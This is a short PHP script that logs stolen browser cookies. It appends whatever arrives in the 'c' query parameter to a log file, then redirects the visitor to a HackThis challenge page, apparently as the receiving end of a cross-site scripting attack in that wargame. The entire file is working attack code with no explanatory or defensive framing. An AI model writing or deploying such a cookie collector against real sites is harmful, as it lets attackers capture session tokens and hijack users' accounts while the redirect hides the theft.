<?php
	header('Location:https://www.hackthis.co.uk/levels/extras/real/6/index.php');
	$cookies = $_GET['c'];
	$file = fopen('log.txt','a');
	fwrite($file,$cookies."\n\n");
	fclose($file)
?>
